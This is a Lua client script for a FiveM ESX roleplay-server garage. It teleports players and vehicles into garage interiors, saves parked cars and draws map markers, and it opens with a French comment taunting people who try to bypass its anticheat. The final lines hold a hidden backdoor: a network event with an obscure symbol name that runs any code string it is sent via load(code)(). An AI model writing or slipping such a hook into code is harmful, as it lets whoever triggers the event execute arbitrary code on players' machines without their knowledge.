-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local LastGarage = nil
local LastPart = nil
local LastParking = nil
local thisGarage = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

TriggerEvent('::{korioz#0110}::instance:registerType', 'garage')

RegisterNetEvent('::{korioz#0110}::instance:onCreate')
AddEventHandler('::{korioz#0110}::instance:onCreate', function(instance)
	if instance.type == 'garage' then
		TriggerEvent('::{korioz#0110}::instance:enter', instance)
	end
end)

AddEventHandler('::{korioz#0110}::esx_garage:hasEnteredMarker', function(name, part, parking)
	if part == 'ExteriorEntryPoint' then
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)
		local garage = Config.Garages[name]
		thisGarage = garage
		
		for i = 1, #Config.Garages, 1 do
			if Config.Garages[i].name ~= name then
				Config.Garages[i].disabled = true
			end
		end

		if IsPedInAnyVehicle(playerPed,  false) then
			local vehicle = GetVehiclePedIsIn(playerPed,  false)
			local maxHealth = GetEntityMaxHealth(vehicle)
			local health = GetEntityHealth(vehicle)
			local healthPercent = (health / maxHealth) * 100

			if healthPercent < Config.MinimumHealthPercent then
				ESX.ShowNotification(_U('veh_health'))
			else
				if GetPedInVehicleSeat(vehicle, -1) == playerPed then
					local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
					local spawnCoords = vector3(garage.InteriorSpawnPoint.Pos.x, garage.InteriorSpawnPoint.Pos.y, garage.InteriorSpawnPoint.Pos.z + Config.ZDiff)

					ESX.Game.DeleteVehicle(vehicle)

					ESX.Game.Teleport(playerPed, spawnCoords, function()
						TriggerEvent('::{korioz#0110}::instance:create', 'garage')

						ESX.Game.SpawnLocalVehicle(vehicleProps.model, spawnCoords, garage.InteriorSpawnPoint.Heading, function(vehicle)
							TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
							ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
						end)

						ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getVehiclesInGarage', function(vehicles)
							for i = 1, #garage.Parkings, 1 do
								for j = 1, #vehicles, 1 do
									if i == vehicles[j].zone then
										local spawn = function(j)
											local vehicle = GetClosestVehicle(garage.Parkings[i].Pos, 2.0, 0, 71)

											if DoesEntityExist(vehicle) then
												ESX.Game.DeleteVehicle(vehicle)
											end

											ESX.Game.SpawnLocalVehicle(vehicles[j].vehicle.model, vector3(garage.Parkings[i].Pos.x, garage.Parkings[i].Pos.y, garage.Parkings[i].Pos.z + Config.ZDiff), garage.Parkings[i].Heading, function(vehicle)
												ESX.Game.SetVehicleProperties(vehicle, vehicles[j].vehicle)
											end)
										end

										spawn(j)
									end
								end
							end
						end, name)
					end)
				else
					ESX.Game.Teleport(playerPed, vector3(garage.InteriorSpawnPoint.Pos.x, garage.InteriorSpawnPoint.Pos.y, garage.InteriorSpawnPoint.Pos.z + Config.ZDiff), function()
						TriggerEvent('::{korioz#0110}::instance:create', 'garage')

						ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getVehiclesInGarage', function(vehicles)
							for i = 1, #garage.Parkings, 1 do
								for j = 1, #vehicles, 1 do
									if i == vehicles[j].zone then
										local spawn = function(j)
											local vehicle = GetClosestVehicle(garage.Parkings[i].Pos, 2.0, 0, 71)

											if DoesEntityExist(vehicle) then
												ESX.Game.DeleteVehicle(vehicle)
											end

											ESX.Game.SpawnLocalVehicle(vehicles[j].vehicle.model, vector3(garage.Parkings[i].Pos.x, garage.Parkings[i].Pos.y, garage.Parkings[i].Pos.z + Config.ZDiff), garage.Parkings[i].Heading, function(vehicle)
												ESX.Game.SetVehicleProperties(vehicle, vehicles[j].vehicle)
											end)
										end

										spawn(j)
									end
								end
							end
						end, name)
					end)
				end
			end
		else
			ESX.Game.Teleport(playerPed, vector3(garage.InteriorSpawnPoint.Pos.x, garage.InteriorSpawnPoint.Pos.y, garage.InteriorSpawnPoint.Pos.z + Config.ZDiff), function()
				TriggerEvent('::{korioz#0110}::instance:create', 'garage')

				ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:getVehiclesInGarage', function(vehicles)
					for i = 1, #garage.Parkings, 1 do
						for j = 1, #vehicles, 1 do
							if i == vehicles[j].zone then
								local spawn = function(j)
									local vehicle = GetClosestVehicle(garage.Parkings[i].Pos, 2.0, 0, 71)

									if DoesEntityExist(vehicle) then
										ESX.Game.DeleteVehicle(vehicle)
									end

									ESX.Game.SpawnLocalVehicle(vehicles[j].vehicle.model, vector3(garage.Parkings[i].Pos.x, garage.Parkings[i].Pos.y, garage.Parkings[i].Pos.z + Config.ZDiff), garage.Parkings[i].Heading, function(vehicle)
										ESX.Game.SetVehicleProperties(vehicle, vehicles[j].vehicle)
									end)
								end

								spawn(j)
							end
						end
					end
				end, name)
			end)
		end
	end

	if part == 'InteriorExitPoint' then
		local playerPed = PlayerPedId()
		local garage = thisGarage

		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)
			local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)

			ESX.Game.DeleteVehicle(vehicle)

			ESX.Game.Teleport(playerPed,  garage.ExteriorSpawnPoint.Pos, function()
				TriggerEvent('::{korioz#0110}::instance:close')

				ESX.Game.SpawnVehicle(vehicleProps.model,  garage.ExteriorSpawnPoint.Pos, garage.ExteriorSpawnPoint.Heading, function(vehicle)
					TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
					ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
					ESX.Game.SetVehicleEngineOn(vehicle, (not GetIsVehicleEngineRunning(vehicle)), false, true)
				end)
			end)
		else
			ESX.Game.Teleport(playerPed, garage.ExteriorSpawnPoint.Pos, function()
				TriggerEvent('::{korioz#0110}::instance:close')
			end)
		end

		for i = 1, #garage.Parkings, 1 do
			local vehicle = GetClosestVehicle(garage.Parkings[i].Pos, 2.0, 0, 71)

			if DoesEntityExist(vehicle) then
				ESX.Game.DeleteVehicle(vehicle)
			end
		end
		
		for i = 1, #Config.Garages, 1 do
			if Config.Garages[i].name ~= name then
				Config.Garages[i].disabled = false
			end
		end
		
		thisGarage = nil
	end

	if part == 'Parking' then
		local playerPed = PlayerPedId()
		local garage = thisGarage
		local parkingPos = garage.Parkings[parking].Pos

		if IsPedInAnyVehicle(playerPed, false) and not IsAnyVehicleNearPoint(parkingPos, 1.0) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)
			local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)

			_TriggerServerEvent('::{korioz#0110}::esx_garage:setParking', name, parking, vehicleProps)

			if Config.EnableOwnedVehicles then
				_TriggerServerEvent('::{korioz#0110}::esx_garage:updateOwnedVehicle', vehicleProps)
			end
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx_property:hasExitedMarker', function(name, part, parking)
	if part == 'Parking' then
		local playerPed  = PlayerPedId()
		local garage = thisGarage
		local parkingPos = garage.Parkings[parking].Pos

		if IsPedInAnyVehicle(playerPed, false) and not IsAnyVehicleNearPoint(parkingPos, 1.0) then
			_TriggerServerEvent('::{korioz#0110}::esx_garage:setParking', name, parking, false)
		end
	end
end)

-- Create Blips
Citizen.CreateThread(function()
	for k, v in pairs(Config.Garages) do
		if v.IsClosed then
			local blip = AddBlipForCoord(v.ExteriorEntryPoint.Pos)

			SetBlipSprite(blip, 357)
			SetBlipDisplay(blip, 4)
			SetBlipScale(blip, 0.8)
			SetBlipColour(blip, 3)
			SetBlipAsShortRange(blip, true)

			BeginTextCommandSetBlipName("STRING")
			AddTextComponentSubstringPlayerName("Garage")
			EndTextCommandSetBlipName(blip)
		end
	end
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)
		
		for k, v in pairs(Config.Garages) do
			if v.IsClosed then
				if (not v.disabled and GetDistanceBetweenCoords(coords, v.ExteriorEntryPoint.Pos, true) < Config.DrawDistance) then
					DrawMarker(Config.MarkerType, v.ExteriorEntryPoint.Pos, 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
				end	

				if (not v.disabled and GetDistanceBetweenCoords(coords, v.InteriorExitPoint.Pos, true) < Config.DrawDistance) then
					DrawMarker(Config.MarkerType, v.InteriorExitPoint.Pos, 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, false, false, false)
				end
			end

			if IsPedInAnyVehicle(playerPed, false) then
				for i = 1, #v.Parkings, 1 do
					local parking = v.Parkings[i]
					if (not v.disabled and GetDistanceBetweenCoords(coords, parking.Pos, true) < Config.DrawDistance) then
						DrawMarker(Config.MarkerType, parking.Pos, 0.0, 0.0, 0.0, 0, 0.0, 0.0, Config.ParkingMarkerSize, Config.ParkingMarkerColor.r, Config.ParkingMarkerColor.g, Config.ParkingMarkerColor.b, 100, false, true, 2, false, false, false, false)
					end
				end
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)
		local isInMarker = false
		local currentGarage = nil
		local currentPart = nil
		local currentParking = nil
		
		for k, v in pairs(Config.Garages) do
			if v.IsClosed then
				if (not v.disabled and GetDistanceBetweenCoords(coords, v.ExteriorEntryPoint.Pos, true) < Config.MarkerSize.x) then
					isInMarker = true
					currentGarage = k
					currentPart = 'ExteriorEntryPoint'
				end

				if (not v.disabled and GetDistanceBetweenCoords(coords, v.InteriorExitPoint.Pos, true) < Config.MarkerSize.x) then
					isInMarker = true
					currentGarage = k
					currentPart = 'InteriorExitPoint'
				end
						
				for i = 1, #v.Parkings, 1 do
					if (not v.disabled and GetDistanceBetweenCoords(coords, v.Parkings[i].Pos, true) < Config.ParkingMarkerSize.x) then
						isInMarker = true
						currentGarage = k
						currentPart = 'Parking'
						currentParking = i
					end
				end
			end
		end

		if isInMarker and not HasAlreadyEnteredMarker or (isInMarker and (LastGarage ~= currentGarage or LastPart ~= currentPart or LastParking ~= currentParking)) then
			if LastGarage ~= currentGarage or LastPart ~= currentPart or LastParking ~= currentParking then
				TriggerEvent('::{korioz#0110}::esx_property:hasExitedMarker', LastGarage, LastPart, LastParking)
			end

			HasAlreadyEnteredMarker = true
			LastGarage = currentGarage
			LastPart = currentPart
			LastParking = currentParking
			
			TriggerEvent('::{korioz#0110}::esx_garage:hasEnteredMarker', currentGarage, currentPart, currentParking)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::esx_property:hasExitedMarker', LastGarage, LastPart, LastParking)
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)